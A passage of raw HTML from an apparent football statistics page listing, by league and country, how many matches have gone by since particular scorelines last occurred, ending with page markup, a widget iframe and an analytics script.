matches<br>Score  4-1 is missing on 218 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>germany - Bundesliga 2</b><br>Score  0-3 is missing on 190 matches<br>Score  1-4 is missing on 346 matches<br>Score  2-0 is missing on 36 matches<br>Score  2-5 is missing on 1062 matches<br>Score  5-1 is missing on 517 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>germany - 3. Liga</b><br>Score  0-1 is missing on 39 matches<br>Score  0-4 is missing on 275 matches<br>Score  1-5 is missing on 972 matches<br>Score  4-0 is missing on 149 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>denmark - SAS Ligaen</b><br>Score  2-0 is missing on 82 matches<br>Score  2-3 is missing on 190 matches<br>Score  3-3 is missing on 326 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>switzerland - Switzerland 1</b><br>Score  2-2 is missing on 65 matches<br>Score  4-0 is missing on 212 matches<br>Score  4-2 is missing on 171 matches<br>Score  5-0 is missing on 232 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>japan - Division 1</b><br>Score  0-4 is missing on 341 matches<br>Score  0-5 is missing on 783 matches<br>Score  4-0 is missing on 214 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>ireland - Eircom Premier</b><br>Score  0-2 is missing on 49 matches<br>Score  0-3 is missing on 111 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>spain - Primera</b><br>Score  2-3 is missing on 141 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>spain - Segunda</b><br>Score  1-4 is missing on 502 matches<br>Score  2-4 is missing on 943 matches<br>Score  3-3 is missing on 334 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>italy - Serie A</b><br>Score  1-2 is missing on 43 matches<br>Score  3-1 is missing on 56 matches<br>Score  4-2 is missing on 514 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>italy - Serie B</b><br>Score  0-2 is missing on 82 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>china - Super League</b><br>Score  0-0 is missing on 44 matches<br>Score  0-1 is missing on 55 matches<br>Score  2-1 is missing on 39 matches<br>Score  2-2 is missing on 57 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>mexico - Mexico</b><br>Score  0-3 is missing on 161 matches<br>Score  0-5 is missing on 2304 matches<br>Score  2-5 is missing on 3362 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>south korea - Division 1</b><br>Score  1-0 is missing on 28 matches<br>Score  2-4 is missing on 347 matches<br>Score  5-1 is missing on 568 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>norway - Tippeligaen</b><br>Score  2-5 is missing on 1064 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>hungary - Division 1</b><br>Score  0-1 is missing on 44 matches<br>Score  1-1 is missing on 56 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>poland - Division 1</b><br>Score  1-0 is missing on 26 matches<br>Score  2-5 is missing on 1726 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>portugal - Division 2</b><br>Score  3-0 is missing on 71 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>portugal - Superliga</b><br>Score  0-1 is missing on 32 matches<br>Score  1-1 is missing on 61 matches<br>Score  2-4 is missing on 734 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>romania - Division 1</b><br>Score  1-3 is missing on 129 matches<br>Score  2-4 is missing on 1066 matches<br>Score  3-2 is missing on 194 matches<br>Score  4-1 is missing on 352 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>russia - Premier Liga</b><br>Score  0-4 is missing on 494 matches<br>Score  2-5 is missing on 1566 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>russia - Division 2</b><br>Score  2-3 is missing on 175 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>scotland - Division 1</b><br>Score  4-0 is missing on 154 matches<br>Score  5-0 is missing on 366 matches<br>Score  5-2 is missing on 481 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>scotland - Division 2</b><br>Score  4-2 is missing on 356 matches<br>Score  5-2 is missing on 714 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>scotland - Premier</b><br>Score  3-3 is missing on 323 matches<br>Score  5-0 is missing on 404 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>scotland - Championship</b><br>Score  1-5 is missing on 472 matches<br>Score  2-2 is missing on 63 matches<br>Score  3-3 is missing on 211 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>turkey - Super League</b><br>Score  5-2 is missing on 918 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>czech - Division 1</b><br>Score  2-3 is missing on 181 matches<br>Score  5-1 is missing on 418 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>chile - Division 1</b><br>Score  3-1 is missing on 60 matches<br>
</table>
</td>
</tr>

<td height=1></td>
</tr>

<td>
<iframe src="https://www.numbergames.gr/widget" width="300" height="250" frameborder="0"></iframe>
</td>

</table> 
</td>

</table>

<br>


   

</td></tr>
</table>
</td>

<td valign=top align=center height=100% bgcolor=#1E5A82>

		

</td>

</table>

</td>
</tr>

<td height=30 valign=middle>

   	

</td>
</tr>

<td width=100%>
</td>
</tr>

</table>


<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-1009163-1";
urchinTracker();
</script>
	
		
</BODY>
</HTML>